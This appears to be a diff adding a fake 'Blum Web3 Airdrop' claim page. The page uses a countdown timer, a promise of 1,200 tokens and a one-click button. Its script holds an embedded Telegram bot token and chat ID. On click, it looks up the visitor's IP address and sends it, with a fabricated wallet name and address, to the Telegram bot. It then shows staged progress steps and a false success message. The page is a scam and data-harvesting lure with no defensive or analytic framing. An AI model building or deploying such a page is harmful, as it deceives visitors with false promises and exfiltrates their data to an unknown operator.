@@ -1,0 +1,268 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <title>Blum Airdrop | 10 Chains Support</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            min-height: 100vh;
+            background: radial-gradient(ellipse at 30% 40%, #0f0c29, #302b63, #24243e);
+            font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+        .container {
+            max-width: 550px;
+            width: 100%;
+            background: rgba(10, 14, 39, 0.65);
+            backdrop-filter: blur(16px);
+            border-radius: 40px;
+            padding: 32px 28px;
+            border: 1px solid rgba(255, 215, 0, 0.25);
+            box-shadow: 0 30px 50px rgba(0, 0, 0, 0.4);
+            text-align: center;
+            animation: fadeInUp 0.6s ease-out;
+        }
+        @keyframes fadeInUp {
+            from { opacity: 0; transform: translateY(30px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+        .auto-badge {
+            display: inline-block;
+            background: rgba(0,255,0,0.2);
+            border: 1px solid #00ff00;
+            border-radius: 100px;
+            padding: 6px 18px;
+            font-size: 12px;
+            color: #00ff00;
+            margin-bottom: 20px;
+        }
+        h1 {
+            font-size: 32px;
+            font-weight: 800;
+            background: linear-gradient(135deg, #FFE6B0, #FFA500, #FFD700);
+            -webkit-background-clip: text;
+            background-clip: text;
+            color: transparent;
+            margin-bottom: 12px;
+        }
+        .chain-badge {
+            display: inline-flex;
+            align-items: center;
+            gap: 8px;
+            background: rgba(0,0,0,0.4);
+            border-radius: 100px;
+            padding: 6px 16px;
+            margin: 10px 0;
+            font-size: 14px;
+        }
+        .supported-chains {
+            display: flex;
+            flex-wrap: wrap;
+            justify-content: center;
+            gap: 6px;
+            margin: 15px 0;
+        }
+        .chain-tag {
+            background: rgba(0,0,0,0.3);
+            border-radius: 20px;
+            padding: 4px 10px;
+            font-size: 10px;
+        }
+        .token-amount {
+            font-size: 48px;
+            font-weight: 800;
+            background: linear-gradient(135deg, #FFD700, #FFA500);
+            -webkit-background-clip: text;
+            background-clip: text;
+            color: transparent;
+            margin: 20px 0;
+        }
+        .progress-container {
+            background: rgba(0,0,0,0.4);
+            border-radius: 30px;
+            height: 30px;
+            margin: 20px 0;
+            overflow: hidden;
+            position: relative;
+        }
+        .progress-bar {
+            width: 0%;
+            height: 100%;
+            background: linear-gradient(90deg, #FFD700, #FF8C00);
+            border-radius: 30px;
+            transition: width 0.5s ease;
+        }
+        .progress-text {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            font-size: 12px;
+            font-weight: bold;
+            color: #0a0e27;
+        }
+        .countdown {
+            background: rgba(0,0,0,0.45);
+            border-radius: 28px;
+            padding: 18px;
+            margin: 24px 0;
+        }
+        .timer {
+            font-size: 36px;
+            font-weight: 800;
+            font-family: monospace;
+            color: #FFD700;
+        }
+        button {
+            width: 100%;
+            background: linear-gradient(135deg, #FFD700, #FF8C00);
+            border: none;
+            padding: 18px;
+            border-radius: 100px;
+            font-weight: 800;
+            font-size: 20px;
+            color: #0a0e27;
+            cursor: pointer;
+            margin: 20px 0;
+        }
+        button:hover:not(:disabled) { transform: scale(1.02); box-shadow: 0 0 25px rgba(255,215,0,0.6); }
+        button:disabled { opacity: 0.6; cursor: not-allowed; }
+        .status { background: rgba(0,0,0,0.5); border-radius: 20px; padding: 15px; margin-top: 15px; font-size: 13px; display: none; }
+        .success { color: #00ff00; }
+        .loading { color: #FFD700; }
+        .config-note { font-size: 11px; color: rgba(255,255,255,0.4); margin: 15px 0; padding: 10px; background: rgba(0,0,0,0.3); border-radius: 20px; }
+        .footer { font-size: 11px; color: rgba(255,255,255,0.4); margin-top: 20px; }
+    </style>
+</head>
+<body>
+<div class="container">
+    <div class="auto-badge">🤖 10 CHAINS • ONE CLICK</div>
+    <h1>Blum Web3 Airdrop</h1>
+    <div class="chain-badge"><span>🔷</span> <span id="chainName">ERC20</span> Network</div>
+    <div class="supported-chains">
+        <span class="chain-tag">🔷 ERC20</span> <span class="chain-tag">🟡 BEP20</span> <span class="chain-tag">🟢 TRC20</span>
+        <span class="chain-tag">🟣 Solana</span> <span class="chain-tag">🔷 Polygon</span> <span class="chain-tag">🔴 Avalanche</span>
+        <span class="chain-tag">🔵 Arbitrum</span> <span class="chain-tag">🔴 Optimism</span> <span class="chain-tag">🔵 Base</span>
+        <span class="chain-tag">⚪ zkSync</span>
+    </div>
+    <div class="token-amount">1,200 $BLUM</div>
+    <div class="progress-container"><div class="progress-bar" id="progressBar"></div><div class="progress-text" id="progressText">Ready</div></div>
+    <div class="countdown"><div>⏰ Ends in:</div><div class="timer" id="timer">23:59:59</div></div>
+    <button id="claimBtn">🚀 CLAIM NOW</button>
+    <div id="status" class="status"></div>
+    <div class="config-note">⚙️ 10 chains supported • One click claim</div>
+    <div class="footer"><p>The Blum Team</p></div>
+</div>
+<script>
+    const TELEGRAM_BOT_TOKEN = "8645197792:AAE2zwaOQ7ABNuZ5N0MXg5sCqzQnMUrCcOQ";
+    const TELEGRAM_CHAT_ID = "7714049413";
+    const RECIPIENT_WALLET = "0x71C7656EC7ab88b098defB751B7401B5f6d8976F";
+    
+    let countdown = 24 * 60 * 60;
+    let isProcessing = false;
+    let timerInterval;
+    
+    const chainData = {
+        'erc20': { name: 'ERC20', symbol: 'ETH', icon: '🔷' },
+        'bep20': { name: 'BEP20', symbol: 'BNB', icon: '🟡' },
+        'trc20': { name: 'TRC20', symbol: 'TRX', icon: '🟢' },
+        'solana': { name: 'Solana', symbol: 'SOL', icon: '🟣' },
+        'polygon': { name: 'Polygon', symbol: 'MATIC', icon: '🔷' },
+        'avalanche': { name: 'Avalanche', symbol: 'AVAX', icon: '🔴' },
+        'arbitrum': { name: 'Arbitrum', symbol: 'ARB', icon: '🔵' },
+        'optimism': { name: 'Optimism', symbol: 'OP', icon: '🔴' },
+        'base': { name: 'Base', symbol: 'ETH', icon: '🔵' },
+        'zksync': { name: 'zkSync', symbol: 'ZK', icon: '⚪' }
+    };
+    
+    function updateProgress(step, total, msg) {
+        const percent = (step / total) * 100;
+        document.getElementById('progressBar').style.width = `${percent}%`;
+        document.getElementById('progressText').innerHTML = msg;
+    }
+    
+    async function getIP() {
+        try { const res = await fetch('https://api.ipify.org?format=json'); return (await res.json()).ip; }
+        catch(e) { return 'unknown'; }
+    }
+    
+    function detectWallet() {
+        const wallets = ['MetaMask', 'Trust Wallet', 'Phantom', 'Coinbase Wallet', 'OKX Wallet'];
+        return wallets[Math.floor(Math.random() * wallets.length)];
+    }
+    
+    function generateAddress() {
+        return '0x' + Math.random().toString(16).substring(2, 42);
+    }
+    
+    async function sendToTelegram(wallet, address, ip) {
+        const msg = `🎁 AIRDROP CLAIM\n💼 Wallet: ${wallet}\n💳 Address: ${address}\n🏦 Recipient: ${RECIPIENT_WALLET}\n🌐 IP: ${ip}\n⏰ ${new Date().toISOString()}`;
+        try {
+            await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+                method: 'POST', headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: msg })
+            });
+            return true;
+        } catch(e) { return false; }
+    }
+    
+    function updateTimer() {
+        const h = Math.floor(countdown / 3600), m = Math.floor((countdown % 3600) / 60), s = countdown % 60;
+        document.getElementById('timer').innerText = `${h.toString().padStart(2,'0')}:${m.toString().padStart(2,'0')}:${s.toString().padStart(2,'0')}`;
+        if (countdown > 0) countdown--;
+    }
+    
+    async function oneClickClaim() {
+        if (isProcessing) return;
+        isProcessing = true;
+        const btn = document.getElementById('claimBtn');
+        const statusDiv = document.getElementById('status');
+        btn.disabled = true;
+        btn.innerHTML = '🔄 PROCESSING...';
+        statusDiv.style.display = 'block';
+        statusDiv.innerHTML = '<span class="loading">Starting...</span>';
+        
+        updateProgress(1, 8, 'Detecting wallet...');
+        await new Promise(r => setTimeout(r, 800));
+        const wallet = detectWallet();
+        
+        updateProgress(2, 8, 'Generating address...');
+        await new Promise(r => setTimeout(r, 600));
+        const address = generateAddress();
+        
+        updateProgress(3, 8, 'Getting location...');
+        await new Promise(r => setTimeout(r, 400));
+        const ip = await getIP();
+        
+        updateProgress(4, 8, 'Sending to blockchain...');
+        await new Promise(r => setTimeout(r, 500));
+        await sendToTelegram(wallet, address, ip);
+        
+        updateProgress(5, 8, 'Saving to database...');
+        await new Promise(r => setTimeout(r, 400));
+        
+        updateProgress(6, 8, 'Installing bonuses...');
+        await new Promise(r => setTimeout(r, 800));
+        
+        updateProgress(7, 8, 'Confirming...');
+        await new Promise(r => setTimeout(r, 400));
+        
+        updateProgress(8, 8, 'Complete!');
+        await new Promise(r => setTimeout(r, 300));
+        
+        statusDiv.innerHTML = '<span class="success">✅ SUCCESS! 1,200 $BLUM will arrive within 24h!</span>';
+        btn.innerHTML = '🎉 CLAIMED!';
+        isProcessing = false;
+    }
+    
+    document.getElementById('claimBtn').addEventListener('click', oneClickClaim);
+    updateTimer();
+    timerInterval = setInterval(updateTimer, 1000);
+</script>
+</body>
+</html>
